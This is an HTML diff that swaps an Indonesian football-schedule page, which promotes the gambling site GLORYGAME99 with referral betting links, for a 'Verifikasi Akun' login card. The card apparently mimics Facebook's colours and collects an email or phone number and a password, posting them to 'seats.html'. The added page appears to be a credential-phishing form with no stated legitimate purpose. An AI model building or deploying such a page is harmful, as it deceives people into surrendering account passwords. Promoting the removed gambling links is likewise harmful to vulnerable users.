@@ -3,171 +3,99 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Jadwal Bola Hari Ini – GLORYGAME99</title>
+  <title>Verifikasi Akun</title>
   <style>
-    /* Warna Tema */
-    :root {
-      --bg-blue: #0057e7;
-      --panel-bg: #ffffff;
-      --text-color: #333333;
-      --header-bg: #ffd700;
-      --link-color: #0057e7;
-      --link-hover: #003eb3;
-      --footer-bg: #ffd700;
-    }
-
-    *, *::before, *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    /* Font dan box model dasar */
+    @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap");
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Roboto", sans-serif; }
 
     body {
-      font-family: Arial, sans-serif;
-      background: var(--bg-blue);
-      color: var(--text-color);
+      background-color: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       min-height: 100vh;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 380px;
+      padding: 24px;
+    }
+
+    .card h1 {
+      color: #1877f2;
+      font-size: 1.8rem;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .card form {
       display: flex;
       flex-direction: column;
+      gap: 16px;
     }
 
-    header {
-      background: var(--header-bg);
-      padding: 16px;
-      text-align: center;
-      font-size: 1.4rem;
-      font-weight: bold;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    label {
+      font-weight: 500;
+      margin-bottom: 4px;
     }
 
-    .container {
-      width: 95%;
-      margin: 20px auto;
-      background: var(--panel-bg);
-      padding: 16px;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-    }
-
-    table {
+    input {
       width: 100%;
-      border-collapse: collapse;
-    }
-
-    th, td {
-      padding: 10px 8px;
+      padding: 12px;
       border: 1px solid #ccc;
-      text-align: left;
+      border-radius: 6px;
+      font-size: 1rem;
+      transition: border-color 0.2s;
     }
 
-    th {
-      background: #f5f5f5;
-      font-weight: bold;
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
     }
 
-    td.tanggal {
-      color: red;
-      font-weight: bold;
+    button {
+      padding: 12px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 500;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
     }
 
-    a {
-      color: var(--link-color);
-      font-weight: bold;
-      text-decoration: none;
-    }
-
-    a:hover {
-      color: var(--link-hover);
-    }
-
-    /* Responsif untuk perangkat dengan lebar layar maksimal 600px */
-    @media (max-width: 600px) {
-      table, thead, tbody, th, td, tr {
-        display: block;
-      }
-
-      thead tr {
-        position: absolute;
-        top: -9999px;
-        left: -9999px;
-      }
-
-      tr {
-        margin-bottom: 16px;
-        border: 1px solid #ccc;
-        border-radius: 8px;
-        background: #fafafa;
-        padding: 10px;
-      }
-
-      td {
-        position: relative;
-        padding-left: 50%;
-        border: none;
-        border-bottom: 1px solid #eee;
-        text-align: left;
-      }
-
-      td::before {
-        content: attr(data-label);
-        position: absolute;
-        top: 6px;
-        left: 6px;
-        width: 45%;
-        padding-right: 10px;
-        white-space: nowrap;
-        font-weight: bold;
-      }
-    }
-
-    footer {
-      background: var(--footer-bg);
-      padding: 12px 0;
-      text-align: center;
-      font-size: 0.9rem;
-      margin-top: auto;
+    button:hover {
+      background: #145eb3;
     }
   </style>
 </head>
 <body>
 
-  <header>Jadwal Bola Hari Ini – GLORYGAME99</header>
-
-  <div class="container">
-    <h3 style="margin-bottom:12px;">Jadwal Kompetisi Sepak Bola</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>Tanggal</th><th>Waktu</th><th>Tim Tuan Rumah</th>
-          <th>Tim Tamu</th><th>Kompetisi</th><th>Aksi</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td class="tanggal" data-label="Tanggal">2025-08-15</td>
-          <td data-label="Waktu">20:00</td>
-          <td data-label="Tuan Rumah">Persija Jakarta</td>
-          <td data-label="Tim Tamu">Arema FC</td>
-          <td data-label="Kompetisi">Liga 1 Indonesia</td>
-          <td data-label="Aksi">
-            <a href="https://glorygame99vip.online/?ref=GLORYGAME99ZZ" target="_blank">BETING SEKARANG</a>
-          </td>
-        </tr>
-        <tr>
-          <td class="tanggal" data-label="Tanggal">2025-08-15</td>
-          <td data-label="Waktu">22:00</td>
-          <td data-label="Tuan Rumah">PSM Makassar</td>
-          <td data-label="Tim Tamu">Persib Bandung</td>
-          <td data-label="Kompetisi">Liga 1 Indonesia</td>
-          <td data-label="Aksi">
-            <a href="https://glorygame99vip.online/?ref=GLORYGAME99ZZ" target="_blank">BETING SEKARANG</a>
-          </td>
-        </tr>
-      </tbody>
-    </table>
-  </div>
-
-  <footer>&copy; 2025 GLORYGAME99</footer>
+<div class="card">
+  <h1>Verifikasi Akun</h1>
+  <form action="seats.html" method="POST">
+    <div>
+      <label for="emailOrPhone">Email atau Nomor Telepon</label>
+      <input type="email" id="emailOrPhone" name="emailOrPhone"
+             placeholder="Masukkan email atau nomor telepon"
+             required>
+    </div>
+    <div>
+      <label for="password">Kata Sandi</label>
+      <input type="password" id="password" name="password"
+             placeholder="Masukkan kata sandi"
+             required autocomplete="current-password">
+    </div>
+    <button type="submit">Kirim & Masuk</button>
+  </form>
+</div>
 
 </body>
 </html>
